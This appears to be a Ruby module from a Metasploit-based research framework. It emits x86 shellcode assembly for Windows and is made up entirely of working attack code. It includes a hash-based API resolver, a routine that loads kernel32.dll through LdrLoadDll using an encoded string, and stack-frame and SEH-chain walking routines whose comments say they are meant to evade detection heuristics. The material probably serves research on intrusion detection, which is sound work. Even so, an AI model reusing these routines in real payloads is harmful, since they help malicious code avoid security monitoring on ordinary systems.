# -*- coding: binary -*-

# =============================================================
# Kernel32.dll base address resolution class
#
# @Author: Jos Wetzels
# =============================================================

require 'ebnids/ebnids'
require 'ebnids/getpc'
require 'rex/poly'
require 'rex/arch'
require 'rex/text'

module Ebnids

  class Kernel32Resolution

    #
    # Given library base address and function name hash (suppliedas stack arguments),
    # resolve address of function in library
    #
    # Original code by: corelanc0d3r <peter.ve[at]corelan.be>
    #
    def findFunction()
      data = <<EOS
find_function:
  pushad        ;save all registers
  mov ebp, [esp  +  0x24] ;put base address of module that is being loaded in ebp
  mov eax, [ebp  +  0x3c] ;skip over MSDOS header
  mov edx, [ebp  +  eax  +  0x78] ;go to export table and put relative address in edx
  add edx, ebp      ;add base address to it.
            ;edx = absolute address of export table
  mov ecx, [edx  +  0x18]   ;set up counter ECX
            ;(how many exported items are in array ?)
  mov ebx, [edx  +  0x20]   ;put names table relative offset in ebx
  add ebx, ebp      ;add base address to it.
            ;ebx = absolute address of names table

find_function_loop:
  jecxz  find_function_finished ;if ecx=0, then last symbol has been checked.
            ;(should never happen)
            ;unless function could not be found
  dec ecx       ;ecx=ecx-1
  mov esi,  [ebx  +  ecx  *  4] ;get relative offset of the name associated
            ;with the current symbol
            ;and store offset in esi
  add esi,  ebp     ;add base address.
            ;esi = absolute address of current symbol

compute_hash:
  xor edi,  edi     ;zero out edi
  xor eax,  eax     ;zero out eax
  cld         ;clear direction flag.
            ;will make sure that it increments instead of
            ;decrements when using lods*

compute_hash_again:
  lodsb         ;load bytes at esi (current symbol name)
            ;into al, + increment esi
  test al, al       ;bitwise test :
            ;see if end of string has been reached
  jz  compute_hash_finished ;if zero flag is set = end of string reached
  ror edi,  0xd     ;if zero flag is not set, rotate current
            ;value of hash 13 bits to the right
  add edi, eax      ;add current character of symbol name
            ;to hash accumulator
  jmp compute_hash_again    ;continue loop

compute_hash_finished:

find_function_compare:
  cmp edi,  [esp  +  0x28]  ;see if computed hash matches requested hash
            ; (at esp+0x28)
            ;edi = current computed hash
            ;esi = current function name (string)
  jnz find_function_loop    ;no match, go to next symbol
  mov ebx,  [edx  +  0x24]  ;if match : extract ordinals table
            ;relative offset and put in ebx
  add ebx,  ebp     ;add base address.
            ;ebx = absolute address of ordinals address table
  mov cx,  [ebx  +  2  *  ecx]  ;get current symbol ordinal number (2 bytes)
  mov ebx,  [edx  +  0x1c]  ;get address table relative and put in ebx
  add ebx,  ebp     ;add base address.
            ;ebx = absolute address of address table
  mov eax,  [ebx  +  4  *  ecx] ;get relative function offset from its ordinal
            ;and put in eax
  add eax,  ebp     ;add base address.
            ;eax = absolute address of function address
  mov [esp  +  0x1c],  eax  ;overwrite stack copy of eax so popad
            ;will return function address in eax
find_function_finished:
  popad         ;restore original registers.
            ;eax will contain function address
  ret
EOS

      data
    end

    #
    # Given EDX being the ntdll.dll or kernel32.dll base address, obtain the kernel32.dll base address
    #
    def toKernel32()
      data = <<EOS
  xor eax, eax ; set to 0 to test if find_function had success

  ; check if LdrLoadDll is present, if not, we have kernel32.dll, else use LdrLoadDll to load it
  push 0xB0988FE4 ; get LdrLoadDll ptr
  push edx
  call find_function

  test eax, eax
  jz gotKernel32

    ; ntdll.dll base address in eax

    ; construct UNICODE_STRING structure on stack

    ; push u('kernel32.dll')
    push 0x016d016d
    push 0x0165012f
    push 0x01330132
    push 0x016d0164
    push 0x016f0173
    push 0x0164016a

    xor ecx, ecx
    sub ecx, -6
    ; decode string to put nullbytes back in
    unzero:
      xor dword [esp+(ecx * 4)-4], 0x01010101
    loop unzero


    push esp ; PWSTR buffer = &libraryName
    
    xor ebx, ebx
    mov bl, (12 * 2)

    push bx  ; USHORT maximumLength
    push bx  ; USHORT length

    mov ebx, esp ; ebx = UNICODE_STRING

    xor ecx, ecx
    push ecx ; allocate DWORD for uModHandle
    mov ecx, esp ; edx = &uModHandle

    push ecx ; push &uModHandle
    push ebx ; push &uModName

    xor ebx, ebx
    push ebx ; NULL
    push ebx ; NULL
    call eax ; ldrLoadDll(0, 0, &uModName, &uModHandle)

    mov eax, [ecx] ; eax = kernel32.dll base address
    sub esp, -(9 * 4) ; restore stack

gotKernel32:
  ; kernel32.dll base address in eax
EOS

    data
    end

    #
    # Resolve kernel32.dll base address evading heuristics using stack-frame walking technique
    #
    def stackFrameWalk()
      toKernel32Code = toKernel32()
      data = <<EOS
  push esi
  push ecx

  mov eax, ebp

  stack_walking:
    mov esi, eax
    lodsd
    mov ecx,[eax]
    test ecx, ecx
  jnz stack_walking

  ; esi now points to last stack frame (and since lodsd increments esi by 4 it points to function in ntdll.dll)
  mov eax,[esi]

  find_begin:
    dec eax
    xor ax,ax     ; work through image until we find base address
    cmp word [eax],0x5A4D ; MZ start of PE header
  jnz find_begin

  pop ecx
  pop esi

  mov edx, eax
  ; edx now points to ntdll.dll or kernel32.dll base address (depending on windows version)

  #{toKernel32Code}
EOS
    data
    end

    #
    # Resolve kernel32.dll base address evading heuristics using SEH-frame walking technique
    #
    def sehFrameWalk()
      toKernel32Code = toKernel32()
      data = <<EOS
  push esi
  push ecx
  push ebx

  xor ebx,ebx
  not ebx ; ebx = 0xFFFFFFFF

  xor ecx, ecx
  mov cl,0x18 ; image size of ntdll.dll image on Windows 7 Ultimate SP1 (ENG), large enough to cover other versions as well
  shl ecx,16

  ; walk SEH chain until we find a candidate default SEH frame
  mov esi,esp
  seh_walking:  
    lodsd ; load dword from stack
    cmp eax,ebx
  jne seh_walking
  ; Check if the candidate default SEH frame has correct function pointer
    ; [esi-4] now points to 0xFFFFFFFF so if this truly is the last SEH frame, [esi] (SE Handler) should point into ntdll.dll or kernel32.dll and [esi+20] (return into RtlUserThreadStart) too
    mov eax,[esi] ; potential SE Handler
    sub eax,[esi+16] ; potential return address of top stack frame
    cmp eax, ecx ; size limit means function pointer candidates have to reside in same image.
  ja seh_walking ; continue walking
  ; we now have a candidate, esi potentially points to default SE Handler in ntdll.dll
  mov eax,[esi]

  ; work through potential image until we find base address (within size limit to reduce potential false positives)
  find_begin:
    ; if we didn't find image base within size limit, give up on this candidate and try next
    test ecx, ecx
    je seh_walking
    dec eax
    xor ax,ax
    cmp word [eax],0x5A4D ; MZ start of PE header
  jnz find_begin

  pop ebx
  pop ecx
  pop esi

  mov edx, eax
  ; edx points to either ntdll.dll or kernel32.dll base address (depending on windows version)

    #{toKernel32Code}
EOS

    data
    end
    
  end

end
